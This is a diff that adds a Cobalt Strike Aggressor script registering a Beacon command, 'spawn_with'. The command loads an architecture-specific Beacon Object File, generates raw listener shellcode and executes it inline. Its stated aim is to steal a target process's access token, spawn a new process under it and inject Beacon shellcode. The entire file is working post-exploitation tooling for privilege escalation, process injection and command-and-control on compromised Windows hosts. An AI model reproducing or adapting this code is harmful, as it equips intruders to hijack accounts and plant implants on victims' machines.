@@ -1,0 +1,31 @@
+alias spawn_with {
+    local('$barch $handle $bof $shellcode $args');
+
+    # get arch of this session
+    $barch  = barch($1);
+
+    # read in the right BOF file
+    $handle = openf(script_resource("bof. $+ $barch $+ .o"));
+    $bof    = readb($handle, -1);
+    closef($handle);
+
+    # get shellcode for listener
+    $shellcode = artifact_payload($3, "raw", $barch, "process", "None");
+
+    # pack our arguments
+    $args = bof_pack($1, "ib", $2, $shellcode);
+
+    # announce what we're doing
+    btask($1, "Task Beacon to run " . listener_describe($3));
+
+    # execute it
+    beacon_inline_execute($1, $bof, "go", $args);
+
+    # try to link if p2p
+    beacon_link($1, $null, $3);
+}
+
+beacon_command_register(
+   "spawn_with", 
+   "Spawn a session as another user", 
+   "Usage: spawn_with [pid] [listener]\n\nAttempt to steal the access token of the target process,\nspawn a new process from it, and inject Beacon shellcode into it.");
